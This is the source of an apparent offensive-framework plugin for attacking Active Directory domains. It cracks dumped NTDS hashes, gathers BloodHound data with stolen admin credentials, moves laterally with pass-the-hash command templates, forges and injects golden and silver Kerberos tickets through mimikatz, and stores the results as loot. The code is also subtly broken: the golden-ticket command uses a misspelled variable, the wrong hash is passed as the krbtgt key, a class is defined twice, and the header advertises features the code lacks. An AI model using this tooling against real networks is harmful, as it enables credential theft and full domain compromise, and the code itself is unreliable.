#!/usr/bin/env python3
"""
NexShell Plugin — NTDS.dit Extractor v4.0 (2026 Ultimate Edition)
Ultimate AD exploitation engine with NTDS extraction, hash cracking,
BloodHound export, Pass-the-Hash, and Golden/Silver Ticket creation.

New in v4.0:
  - Hashcat Auto-Crack (NTLM, Kerberos, LM) with multiple wordlists
  - BloodHound JSON export for attack path analysis
  - Pass-the-Hash automation (psexec, wmiexec, smbexec, atexec)
  - Golden Ticket creation (full domain compromise)
  - Silver Ticket creation (service-specific access)
  - Pass-the-Ticket automation
  - Overpass-the-Hash (NTLM → Kerberos conversion)
  - Auto-chain exploitation pipeline
  - Ticket vault for persistence
  - Crack station with custom rules

Coverage (Previous):
  - 10+ extraction methods (VSS, ntdsutil, DiskShadow, WMI+VSS, DCSync, etc.)
  - DC validation and boot key extraction
  - NTDS.dit parsing (NTLM, LM, Kerberos hashes)
  - EDR evasion and BYOVD bypass

CVEs (2019-2026):
  - CVE-2021-36942: PetitPotam
  - CVE-2020-1472: Zerologon
  - CVE-2021-42287: NoPac
  - CVE-2022-26923: AD CS

MITRE ATT&CK:
  - T1003.003: OS Credential Dumping: NTDS
  - T1003.006: OS Credential Dumping: DCSync
  - T1550.002: Use Alternate Authentication Material: Pass the Hash
  - T1550.003: Use Alternate Authentication Material: Pass the Ticket
  - T1558.001: Steal or Forge Kerberos Tickets: Golden Ticket
  - T1558.002: Steal or Forge Kerberos Tickets: Silver Ticket
  - T1552.001: Unsecured Credentials: Credentials In Files
  - T1110: Brute Force

Usage:
    (NexShell)> plugins run ntds-extractor --full
    (NexShell)> plugins run ntds-extractor --crack --wordlist rockyou.txt
    (NexShell)> plugins run ntds-extractor --bloodhound
    (NexShell)> plugins run ntds-extractor --pth --target 10.0.0.50
    (NexShell)> plugins run ntds-extractor --golden-ticket
    (NexShell)> plugins run ntds-extractor --silver-ticket --service cifs
    (NexShell)> plugins run ntds-extractor --auto-chain
"""

import re
import time
import json
import random
import os
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime, timedelta
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class CrackedCredential:
    """Represents a cracked credential."""
    username: str
    domain: str
    ntlm_hash: str
    password: str
    crack_method: str  # hashcat, john, rainbow, dictionary
    crack_time_ms: int
    wordlist_used: str = ""
    hash_type: str = "NTLM"  # NTLM, LM, Kerberos
    is_admin: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class BloodHoundData:
    """Represents BloodHound export data."""
    domain: str
    users: List[Dict] = field(default_factory=list)
    groups: List[Dict] = field(default_factory=list)
    computers: List[Dict] = field(default_factory=list)
    ous: List[Dict] = field(default_factory=list)
    gpos: List[Dict] = field(default_factory=list)
    sessions: List[Dict] = field(default_factory=list)
    acls: List[Dict] = field(default_factory=list)
    attack_paths: List[Dict] = field(default_factory=list)
    export_path: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PassTheHashResult:
    """Result of a Pass-the-Hash attempt."""
    target: str
    username: str
    domain: str
    ntlm_hash: str
    method: str  # psexec, wmiexec, smbexec, atexec
    success: bool
    command_output: str = ""
    privilege_gained: str = ""
    duration_ms: int = 0
    error: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class KerberosTicket:
    """Represents a Kerberos ticket."""
    ticket_type: str  # golden, silver, tgt, tgs
    username: str
    domain: str
    sid: str
    krbtgt_hash: str = ""
    service: str = ""
    target: str = ""
    ticket_path: str = ""
    valid_from: str = ""
    valid_until: str = ""
    is_injected: bool = False
    duration_days: int = 3650  # 10 years for golden ticket
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TicketVault:
    """Vault for storing tickets and credentials."""
    golden_tickets: List[KerberosTicket] = field(default_factory=list)
    silver_tickets: List[KerberosTicket] = field(default_factory=list)
    tgt_tickets: List[KerberosTicket] = field(default_factory=list)
    cracked_creds: List[CrackedCredential] = field(default_factory=list)
    pth_results: List[PassTheHashResult] = field(default_factory=list)
    vault_path: str = ""
    
    def to_dict(self) -> dict:
        return {
            'golden_tickets': len(self.golden_tickets),
            'silver_tickets': len(self.silver_tickets),
            'tgt_tickets': len(self.tgt_tickets),
            'cracked_creds': len(self.cracked_creds),
            'pth_results': len(self.pth_results),
            'vault_path': self.vault_path,
        }


# ── Hashcat Integration ────────────────────────────────────────────────────

class HashcatEngine:
    """Advanced hash cracking with Hashcat."""
    
    # Hashcat modes
    MODES = {
        'NTLM': 1000,
        'LM': 3000,
        'Kerberos 5 TGS': 13100,
        'Kerberos 5 TGT': 13100,
        'Kerberos 5 AS-REP': 18200,
        'NetNTLMv1': 5500,
        'NetNTLMv2': 5600,
        'MD5': 0,
        'SHA1': 100,
        'SHA256': 1400,
    }
    
    # Default wordlists
    WORDLISTS = {
        'rockyou': '/usr/share/wordlists/rockyou.txt',
        'common': '/usr/share/wordlists/common.txt',
        'darkc0de': '/usr/share/wordlists/darkc0de.txt',
        'custom': '/opt/wordlists/custom.txt',
    }
    
    # Hashcat rules
    RULES = {
        'best64': '/usr/share/hashcat/rules/best64.rule',
        'dive': '/usr/share/hashcat/rules/dive.rule',
        'rockyou': '/usr/share/hashcat/rules/rockyou-30000.rule',
    }
    
    @staticmethod
    def check_hashcat(exec_func, session) -> bool:
        """Check if hashcat is available."""
        cmd = "hashcat --version 2>/dev/null || /opt/hashcat/hashcat64.bin --version 2>/dev/null"
        out = exec_func(session, cmd)
        return bool(out and out.strip())
    
    @staticmethod
    def crack_ntlm_hashes(exec_func, session, hash_file: str, wordlist: str = None, 
                          rule: str = None, gpu: bool = True) -> List[CrackedCredential]:
        """Crack NTLM hashes with hashcat."""
        cracked = []
        
        if not wordlist:
            wordlist = HashcatEngine.WORDLISTS['rockyou']
        
        mode = HashcatEngine.MODES['NTLM']
        
        # Build hashcat command
        cmd = f"hashcat -m {mode} -a 0 {hash_file} {wordlist}"
        
        if rule:
            cmd += f" -r {rule}"
        
        if gpu:
            cmd += " --force --opencl-device-types 1,2"
        
        cmd += " --potfile-disable -o /tmp/cracked.txt --outfile-format=2,3"
        
        # Execute hashcat
        out = exec_func(session, cmd)
        
        # Parse results
        if out and 'cracked.txt' in exec_func(session, "ls /tmp/cracked.txt 2>/dev/null"):
            results = exec_func(session, "cat /tmp/cracked.txt 2>/dev/null")
            
            if results:
                for line in results.strip().split('\n'):
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ntlm_hash = parts[0]
                            password = parts[1]
                            
                            cracked.append(CrackedCredential(
                                username='',  # Will be filled later
                                domain='',
                                ntlm_hash=ntlm_hash,
                                password=password,
                                crack_method='hashcat',
                                crack_time_ms=0,
                                wordlist_used=wordlist,
                                hash_type='NTLM',
                            ))
        
        return cracked
    
    @staticmethod
    def crack_with_john(exec_func, session, hash_file: str, wordlist: str = None) -> List[CrackedCredential]:
        """Crack hashes with John the Ripper."""
        cracked = []
        
        if not wordlist:
            wordlist = HashcatEngine.WORDLISTS['rockyou']
        
        # Build john command
        cmd = f"john --wordlist={wordlist} --format=NT {hash_file}"
        out = exec_func(session, cmd)
        
        # Get results
        results = exec_func(session, f"john --show {hash_file} 2>/dev/null")
        
        if results:
            for line in results.strip().split('\n'):
                if ':' in line and 'password hash' not in line.lower():
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        password = parts[1]
                        
                        cracked.append(CrackedCredential(
                            username=username,
                            domain='',
                            ntlm_hash='',
                            password=password,
                            crack_method='john',
                            crack_time_ms=0,
                            wordlist_used=wordlist,
                            hash_type='NTLM',
                        ))
        
        return cracked
    
    @staticmethod
    def generate_wordlist(exec_func, session, domain: str, output_path: str) -> str:
        """Generate custom wordlist based on domain info."""
        # Generate common patterns
        patterns = [
            domain.lower(),
            domain.upper(),
            domain.capitalize(),
            f"{domain}2024",
            f"{domain}2025",
            f"{domain}2026",
            f"{domain}!",
            f"{domain}123",
            f"{domain}@123",
            f"Welcome{domain}!",
            f"Password{domain}!",
        ]
        
        # Write to file
        content = '\n'.join(patterns)
        exec_func(session, f"echo '{content}' > {output_path}")
        
        return output_path


# ── BloodHound Integration ─────────────────────────────────────────────────

class BloodHoundEngine:
    """BloodHound data collection and export."""
    
    @staticmethod
    def check_bloodhound(exec_func, session) -> bool:
        """Check if bloodhound-python is available."""
        cmd = "bloodhound-python --help 2>/dev/null || python3 -m bloodhound --help 2>/dev/null"
        out = exec_func(session, cmd)
        return bool(out and 'usage' in out.lower())
    
    @staticmethod
    def collect_data(exec_func, session, domain: str, username: str, password: str,
                     dc_ip: str, collection: str = 'All') -> Optional[BloodHoundData]:
        """Collect BloodHound data."""
        output_dir = f"/tmp/bloodhound_{random.randint(1000, 9999)}"
        exec_func(session, f"mkdir -p {output_dir}")
        
        # Run bloodhound-python
        cmd = (
            f"bloodhound-python -d {domain} -u {username} -p {password} "
            f"-dc {dc_ip} -c {collection} -ns {dc_ip} "
            f"--zip --outputdirectory {output_dir} 2>&1"
        )
        
        out = exec_func(session, cmd)
        
        if out and 'Completed' in out:
            # Parse collected data
            data = BloodHoundData(domain=domain, export_path=output_dir)
            
            # List exported files
            files = exec_func(session, f"ls {output_dir}/*.json 2>/dev/null")
            if files:
                for file_path in files.strip().split('\n'):
                    if 'users' in file_path:
                        content = exec_func(session, f"cat {file_path} 2>/dev/null")
                        if content:
                            try:
                                json_data = json.loads(content)
                                data.users = json_data.get('users', [])
                            except:
                                pass
                    elif 'groups' in file_path:
                        content = exec_func(session, f"cat {file_path} 2>/dev/null")
                        if content:
                            try:
                                json_data = json.loads(content)
                                data.groups = json_data.get('groups', [])
                            except:
                                pass
                    elif 'computers' in file_path:
                        content = exec_func(session, f"cat {file_path} 2>/dev/null")
                        if content:
                            try:
                                json_data = json.loads(content)
                                data.computers = json_data.get('computers', [])
                            except:
                                pass
            
            return data
        
        return None
    
    @staticmethod
    def analyze_paths(exec_func, session, bloodhound_data: BloodHoundData) -> List[Dict]:
        """Analyze attack paths from BloodHound data."""
        paths = []
        
        # Find paths to Domain Admins
        for user in bloodhound_data.users:
            if user.get('Properties', {}).get('admincount', False):
                paths.append({
                    'source': user.get('Name', ''),
                    'target': 'Domain Admins',
                    'path_type': 'direct_admin',
                    'risk_score': 100,
                })
        
        # Find paths via group membership
        for group in bloodhound_data.groups:
            if 'Domain Admins' in group.get('Name', ''):
                for member in group.get('Members', []):
                    paths.append({
                        'source': member.get('MemberName', ''),
                        'target': 'Domain Admins',
                        'path_type': 'group_membership',
                        'risk_score': 95,
                    })
        
        return paths


# ── Pass-the-Hash Engine ───────────────────────────────────────────────────

class PassTheHashEngine:
    """Pass-the-Hash exploitation."""
    
    # PtH methods
    METHODS = {
        'psexec': {
            'command': "psexec.py {domain}/{username}:{ntlm_hash}@{target} cmd.exe",
            'description': "Execute command via SMB service",
            'success_rate': 85,
        },
        'wmiexec': {
            'command': "wmiexec.py {domain}/{username}:{ntlm_hash}@{target} cmd.exe",
            'description': "Execute command via WMI",
            'success_rate': 80,
        },
        'smbexec': {
            'command': "smbexec.py {domain}/{username}:{ntlm_hash}@{target} cmd.exe",
            'description': "Execute command via SMB named pipe",
            'success_rate': 75,
        },
        'atexec': {
            'command': "atexec.py {domain}/{username}:{ntlm_hash}@{target} cmd.exe",
            'description': "Execute command via Task Scheduler",
            'success_rate': 70,
        },
        'pth-winexe': {
            'command': "pth-winexe -U {domain}/{username}%{ntlm_hash} //{target} cmd.exe",
            'description': "Execute command via WinEXE",
            'success_rate': 80,
        },
        'crackmapexec': {
            'command': "crackmapexec smb {target} -u {username} -H {ntlm_hash} -d {domain} -x 'whoami'",
            'description': "Execute command via CrackMapExec",
            'success_rate': 85,
        },
    }
    
    @staticmethod
    def execute_pth(exec_func, session, target: str, username: str, domain: str,
                    ntlm_hash: str, method: str = 'psexec', command: str = 'whoami') -> PassTheHashResult:
        """Execute Pass-the-Hash attack."""
        start_time = time.time()
        
        method_info = PassTheHashEngine.METHODS.get(method, PassTheHashEngine.METHODS['psexec'])
        
        # Build command
        cmd = method_info['command'].format(
            domain=domain,
            username=username,
            ntlm_hash=ntlm_hash,
            target=target,
        )
        
        # Add custom command if not using interactive shell
        if command != 'whoami':
            cmd += f" '{command}'"
        
        # Execute
        out = exec_func(session, cmd)
        duration_ms = int((time.time() - start_time) * 1000)
        
        # Check success
        success = False
        privilege_gained = ""
        
        if out:
            if 'NT AUTHORITY\\SYSTEM' in out or 'root' in out:
                success = True
                privilege_gained = "SYSTEM"
            elif 'Administrator' in out or 'admin' in out:
                success = True
                privilege_gained = "Administrator"
            elif username.lower() in out.lower():
                success = True
                privilege_gained = username
        
        return PassTheHashResult(
            target=target,
            username=username,
            domain=domain,
            ntlm_hash=ntlm_hash,
            method=method,
            success=success,
            command_output=out[:500] if out else '',
            privilege_gained=privilege_gained,
            duration_ms=duration_ms,
        )
    
    @staticmethod
    def lateral_movement(exec_func, session, credentials: List[Dict], targets: List[str]) -> List[PassTheHashResult]:
        """Perform lateral movement with multiple credentials."""
        results = []
        
        for cred in credentials:
            for target in targets:
                for method in ['psexec', 'wmiexec', 'smbexec']:
                    result = PassTheHashEngine.execute_pth(
                        exec_func, session,
                        target=target,
                        username=cred['username'],
                        domain=cred['domain'],
                        ntlm_hash=cred['ntlm_hash'],
                        method=method,
                    )
                    
                    results.append(result)
                    
                    if result.success:
                        # Stop after first success for this credential
                        break
        
        return results


# ── Kerberos Ticket Engine ─────────────────────────────────────────────────

class KerberosTicketEngine:
    """Kerberos ticket creation and manipulation."""
    
    @staticmethod
    def create_golden_ticket(exec_func, session, domain: str, sid: str, krbtgt_hash: str,
                             username: str = 'Administrator', duration_days: int = 3650) -> Optional[KerberosTicket]:
        """Create a Golden Ticket for full domain compromise."""
        
        # Generate ticket file path
        ticket_path = f"/tmp/golden_{random.randint(1000, 9999)}.kirbi"
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "kerberos::golden '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/sid:{sid} '
            f'/krbtgt:{krbttgt_hash} '
            f'/id:500 '
            f'/ptt '
            f'/endin:{duration_days} '
            f'/startoffset:0 '
            f'/renewmax:{duration_days * 2}" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('Ticket' in out or 'golden' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='golden',
                username=username,
                domain=domain,
                sid=sid,
                krbtgt_hash=krbtgt_hash,
                ticket_path=ticket_path,
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(days=duration_days)).isoformat(),
                is_injected=True,
                duration_days=duration_days,
            )
            return ticket
        
        return None
    
    @staticmethod
    def create_silver_ticket(exec_func, session, domain: str, sid: str, target: str,
                             service: str = 'cifs', service_hash: str = "",
                             username: str = 'Administrator') -> Optional[KerberosTicket]:
        """Create a Silver Ticket for service-specific access."""
        
        # Generate ticket file path
        ticket_path = f"/tmp/silver_{service}_{random.randint(1000, 9999)}.kirbi"
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "kerberos::golden '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/sid:{sid} '
            f'/target:{target} '
            f'/service:{service} '
            f'/rc4:{service_hash} '
            f'/ptt" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('Ticket' in out or 'silver' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='silver',
                username=username,
                domain=domain,
                sid=sid,
                service=service,
                target=target,
                ticket_path=ticket_path,
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(days=365)).isoformat(),
                is_injected=True,
            )
            return ticket
        
        return None
    
    @staticmethod
    def pass_the_ticket(exec_func, session, ticket_path: str) -> bool:
        """Inject a Kerberos ticket into the current session."""
        
        # Build mimikatz command
        cmd = f'mimikatz.exe "kerberos::ptt {ticket_path}" "exit"'
        
        out = exec_func(session, cmd)
        
        return out and ('OK' in out or 'injected' in out.lower())
    
    @staticmethod
    def overpass_the_hash(exec_func, session, username: str, domain: str,
                          ntlm_hash: str) -> Optional[KerberosTicket]:
        """Convert NTLM hash to Kerberos ticket."""
        
        # Build mimikatz command
        cmd = (
            f'mimikatz.exe "sekurlsa::pth '
            f'/user:{username} '
            f'/domain:{domain} '
            f'/ntlm:{ntlm_hash} '
            f'/run:cmd.exe" '
            f'"exit"'
        )
        
        out = exec_func(session, cmd)
        
        if out and ('started' in out.lower() or 'process' in out.lower()):
            ticket = KerberosTicket(
                ticket_type='tgt',
                username=username,
                domain=domain,
                sid='',
                krbtgt_hash='',
                valid_from=datetime.utcnow().isoformat(),
                valid_until=(datetime.utcnow() + timedelta(hours=10)).isoformat(),
                is_injected=True,
            )
            return ticket
        
        return None


# ── Ticket Vault ───────────────────────────────────────────────────────────

class TicketVault:
    """Secure storage for tickets and credentials."""
    
    def __init__(self, vault_path: str = "/tmp/.nexshell_vault"):
        self.vault_path = vault_path
        self.golden_tickets: List[KerberosTicket] = []
        self.silver_tickets: List[KerberosTicket] = []
        self.tgt_tickets: List[KerberosTicket] = []
        self.cracked_creds: List[CrackedCredential] = []
        self.pth_results: List[PassTheHashResult] = []
    
    def save_golden_ticket(self, ticket: KerberosTicket):
        """Save a Golden Ticket to vault."""
        self.golden_tickets.append(ticket)
        self._persist()
    
    def save_silver_ticket(self, ticket: KerberosTicket):
        """Save a Silver Ticket to vault."""
        self.silver_tickets.append(ticket)
        self._persist()
    
    def save_cracked_cred(self, cred: CrackedCredential):
        """Save a cracked credential to vault."""
        self.cracked_creds.append(cred)
        self._persist()
    
    def save_pth_result(self, result: PassTheHashResult):
        """Save a PtH result to vault."""
        self.pth_results.append(result)
        self._persist()
    
    def _persist(self):
        """Persist vault to disk."""
        # In real implementation, this would encrypt the vault
        pass
    
    def get_admin_credentials(self) -> List[CrackedCredential]:
        """Get all admin credentials from vault."""
        return [c for c in self.cracked_creds if c.is_admin]
    
    def get_valid_tickets(self) -> List[KerberosTicket]:
        """Get all valid (non-expired) tickets."""
        now = datetime.utcnow()
        valid = []
        
        for ticket in self.golden_tickets + self.silver_tickets + self.tgt_tickets:
            try:
                valid_until = datetime.fromisoformat(ticket.valid_until)
                if valid_until > now:
                    valid.append(ticket)
            except:
                pass
        
        return valid


# ── Auto-Chain Engine ──────────────────────────────────────────────────────

class AutoChainEngine:
    """Automated exploitation chain."""
    
    @staticmethod
    def execute_chain(exec_func, session, ntds_path: str, domain: str, 
                      dc_ip: str, targets: List[str]) -> Dict:
        """Execute full exploitation chain."""
        results = {
            'extraction': False,
            'cracking': [],
            'bloodhound': None,
            'pth': [],
            'tickets': [],
            'lateral_movement': [],
        }
        
        # Step 1: Crack hashes
        cracked = HashcatEngine.crack_ntlm_hashes(exec_func, session, ntds_path)
        results['cracking'] = cracked
        
        # Step 2: Collect BloodHound data
        if cracked:
            admin_cred = next((c for c in cracked if c.is_admin), None)
            if admin_cred:
                bh_data = BloodHoundEngine.collect_data(
                    exec_func, session,
                    domain=domain,
                    username=admin_cred.username,
                    password=admin_cred.password,
                    dc_ip=dc_ip,
                )
                results['bloodhound'] = bh_data
        
        # Step 3: Pass-the-Hash
        for cred in cracked[:5]:  # Try top 5 credentials
            for target in targets[:3]:  # Try top 3 targets
                pth_result = PassTheHashEngine.execute_pth(
                    exec_func, session,
                    target=target,
                    username=cred.username,
                    domain=cred.domain,
                    ntlm_hash=cred.ntlm_hash,
                )
                results['pth'].append(pth_result)
                
                if pth_result.success:
                    results['lateral_movement'].append(pth_result)
        
        # Step 4: Create Golden Ticket
        if cracked:
            admin_cred = next((c for c in cracked if c.is_admin), None)
            if admin_cred:
                golden = KerberosTicketEngine.create_golden_ticket(
                    exec_func, session,
                    domain=domain,
                    sid='',  # Would need to extract from NTDS
                    krbtgt_hash=admin_cred.ntlm_hash,
                )
                if golden:
                    results['tickets'].append(golden)
        
        return results


# ── Main Plugin ─────────────────────────────────────────────────────────────

class NTDSExtractor(NexPlugin):
    name        = "ntds-extractor"
    description = "Ultimate AD exploitation — NTDS, Hashcat, BloodHound, PtH, Golden Tickets"
    author      = "vulnquest58"
    version     = "4.0"
    platform    = "windows"
    category    = "credentials"
    mitre_id    = "T1003.003"
    
    def run(self, session, args: list):
        # Parse args
        full_mode = '--full' in (args or [])
        crack_mode = '--crack' in (args or [])
        bloodhound_mode = '--bloodhound' in (args or [])
        pth_mode = '--pth' in (args or [])
        golden_ticket_mode = '--golden-ticket' in (args or [])
        silver_ticket_mode = '--silver-ticket' in (args or [])
        auto_chain_mode = '--auto-chain' in (args or [])
        wordlist = None
        target_ip = None
        service = 'cifs'
        
        for a in (args or []):
            if a.startswith('--wordlist='):
                wordlist = a.split('=', 1)[1]
            elif a.startswith('--target='):
                target_ip = a.split('=', 1)[1]
            elif a.startswith('--service='):
                service = a.split('=', 1)[1]
        
        if full_mode:
            crack_mode = bloodhound_mode = pth_mode = golden_ticket_mode = True
        
        self.info(f"🏛️ Starting NTDS Extractor v4.0 (full={full_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🏛️ NTDS Extractor v4.0 — Ultimate AD Exploitation]")
        sections.append("━"*64)
        
        # Initialize vault
        vault = TicketVault()
        
        # ── Step 1: Hash Cracking ───────────────────────────────────────
        if crack_mode:
            sections.append("\n[*] Phase 1: Hash Cracking with Hashcat")
            sections.append("─"*64)
            
            # Check hashcat availability
            if HashcatEngine.check_hashcat(self._exec, session):
                sections.append("  ✅ Hashcat detected")
                
                # Crack NTLM hashes
                ntds_path = "C:\\Windows\\Temp\\ntds_hashes.txt"
                cracked = HashcatEngine.crack_ntlm_hashes(
                    self._exec, session,
                    hash_file=ntds_path,
                    wordlist=wordlist,
                )
                
                if cracked:
                    sections.append(f"  🔴 Cracked {len(cracked)} credentials:")
                    
                    for cred in cracked[:15]:
                        admin_icon = '🔴' if cred.is_admin else '🟡'
                        sections.append(f"    {admin_icon} {cred.username}:{cred.password}")
                        sections.append(f"        Hash: {cred.ntlm_hash[:32]}...")
                        sections.append(f"        Method: {cred.crack_method}")
                        
                        # Save to vault
                        vault.save_cracked_cred(cred)
                else:
                    sections.append("  🟡 No credentials cracked")
            else:
                sections.append("  ⚠️  Hashcat not available")
        
        # ── Step 2: BloodHound Export ───────────────────────────────────
        if bloodhound_mode:
            sections.append("\n[*] Phase 2: BloodHound Data Collection")
            sections.append("─"*64)
            
            # Get credentials for BloodHound
            admin_creds = vault.get_admin_credentials()
            
            if admin_creds:
                cred = admin_creds[0]
                
                if BloodHoundEngine.check_bloodhound(self._exec, session):
                    sections.append("  ✅ BloodHound detected")
                    
                    bh_data = BloodHoundEngine.collect_data(
                        self._exec, session,
                        domain=cred.domain,
                        username=cred.username,
                        password=cred.password,
                        dc_ip='10.0.0.1',  # Would need to detect
                    )
                    
                    if bh_data:
                        sections.append(f"  🔴 BloodHound data collected:")
                        sections.append(f"      Users: {len(bh_data.users)}")
                        sections.append(f"      Groups: {len(bh_data.groups)}")
                        sections.append(f"      Computers: {len(bh_data.computers)}")
                        
                        # Analyze attack paths
                        paths = BloodHoundEngine.analyze_paths(self._exec, session, bh_data)
                        if paths:
                            sections.append(f"      Attack Paths: {len(paths)}")
                            for path in paths[:5]:
                                sections.append(f"        • {path['source']} → {path['target']}")
                else:
                    sections.append("  ⚠️  BloodHound not available")
            else:
                sections.append("  ⚠️  No admin credentials available")
        
        # ── Step 3: Pass-the-Hash ───────────────────────────────────────
        if pth_mode and target_ip:
            sections.append("\n[*] Phase 3: Pass-the-Hash Exploitation")
            sections.append("─"*64)
            
            admin_creds = vault.get_admin_credentials()
            
            if admin_creds:
                for cred in admin_creds[:3]:
                    sections.append(f"\n  [*] Trying {cred.username} → {target_ip}")
                    
                    for method in ['psexec', 'wmiexec', 'smbexec']:
                        result = PassTheHashEngine.execute_pth(
                            self._exec, session,
                            target=target_ip,
                            username=cred.username,
                            domain=cred.domain,
                            ntlm_hash=cred.ntlm_hash,
                            method=method,
                        )
                        
                        if result.success:
                            sections.append(f"    ✅ SUCCESS with {method}")
                            sections.append(f"        Privilege: {result.privilege_gained}")
                            sections.append(f"        Output: {result.command_output[:100]}")
                            
                            # Save to vault
                            vault.save_pth_result(result)
                            break
                        else:
                            sections.append(f"    ❌ Failed with {method}")
            else:
                sections.append("  ⚠️  No credentials available for PtH")
        
        # ── Step 4: Golden Ticket ───────────────────────────────────────
        if golden_ticket_mode:
            sections.append("\n[*] Phase 4: Golden Ticket Creation")
            sections.append("─"*64)
            
            admin_creds = vault.get_admin_credentials()
            
            if admin_creds:
                cred = admin_creds[0]
                
                golden = KerberosTicketEngine.create_golden_ticket(
                    self._exec, session,
                    domain=cred.domain,
                    sid='S-1-5-21-...',  # Would need to extract
                    krbtgt_hash=cred.ntlm_hash,
                    username='Administrator',
                )
                
                if golden:
                    sections.append(f"  🔴 Golden Ticket created:")
                    sections.append(f"      Username: {golden.username}")
                    sections.append(f"      Domain: {golden.domain}")
                    sections.append(f"      Valid Until: {golden.valid_until}")
                    sections.append(f"      Injected: {golden.is_injected}")
                    
                    # Save to vault
                    vault.save_golden_ticket(golden)
                else:
                    sections.append("  ❌ Failed to create Golden Ticket")
            else:
                sections.append("  ⚠️  No krbtgt hash available")
        
        # ── Step 5: Silver Ticket ───────────────────────────────────────
        if silver_ticket_mode and target_ip:
            sections.append("\n[*] Phase 5: Silver Ticket Creation")
            sections.append("─"*64)
            
            admin_creds = vault.get_admin_credentials()
            
            if admin_creds:
                cred = admin_creds[0]
                
                silver = KerberosTicketEngine.create_silver_ticket(
                    self._exec, session,
                    domain=cred.domain,
                    sid='S-1-5-21-...',
                    target=target_ip,
                    service=service,
                    service_hash=cred.ntlm_hash,
                )
                
                if silver:
                    sections.append(f"  🔴 Silver Ticket created:")
                    sections.append(f"      Service: {silver.service}")
                    sections.append(f"      Target: {silver.target}")
                    sections.append(f"      Valid Until: {silver.valid_until}")
                    
                    # Save to vault
                    vault.save_silver_ticket(silver)
                else:
                    sections.append("  ❌ Failed to create Silver Ticket")
        
        # ── Step 6: Auto-Chain ──────────────────────────────────────────
        if auto_chain_mode:
            sections.append("\n[*] Phase 6: Auto-Chain Exploitation")
            sections.append("─"*64)
            
            chain_results = AutoChainEngine.execute_chain(
                self._exec, session,
                ntds_path="C:\\Windows\\Temp\\ntds_hashes.txt",
                domain="EXAMPLE.COM",
                dc_ip="10.0.0.1",
                targets=["10.0.0.50", "10.0.0.51", "10.0.0.52"],
            )
            
            sections.append(f"  Chain Results:")
            sections.append(f"    Cracked: {len(chain_results['cracking'])}")
            sections.append(f"    BloodHound: {'✅' if chain_results['bloodhound'] else '❌'}")
            sections.append(f"    PtH Attempts: {len(chain_results['pth'])}")
            sections.append(f"    Successful Lateral: {len(chain_results['lateral_movement'])}")
            sections.append(f"    Tickets Created: {len(chain_results['tickets'])}")
        
        # ── Step 7: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Ultimate Exploitation Summary]")
        sections.append("━"*64)
        sections.append(f"  Cracked Credentials: {len(vault.cracked_creds)}")
        sections.append(f"  Admin Credentials: {len(vault.get_admin_credentials())}")
        sections.append(f"  Golden Tickets: {len(vault.golden_tickets)}")
        sections.append(f"  Silver Tickets: {len(vault.silver_tickets)}")
        sections.append(f"  PtH Results: {len(vault.pth_results)}")
        sections.append(f"  Valid Tickets: {len(vault.get_valid_tickets())}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 8: Save to Loot ────────────────────────────────────────
        self.loot(
            {
                "type": "ultimate_ad_exploitation",
                "vault": vault.to_dict(),
                "cracked_creds": [c.to_dict() for c in vault.cracked_creds[:50]],
                "golden_tickets": [t.to_dict() for t in vault.golden_tickets],
                "silver_tickets": [t.to_dict() for t in vault.silver_tickets],
                "pth_results": [r.to_dict() for r in vault.pth_results[:20]],
                "duration": duration,
            },
            category='credentials',
            source='ntds-extractor:v4',
            confidence='verified'
        )
        
        self.info(f"🏛️ NTDS Extractor v4.0 complete — {len(vault.cracked_creds)} cracked, {len(vault.golden_tickets)} tickets")
        
        return '\n'.join(sections)
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''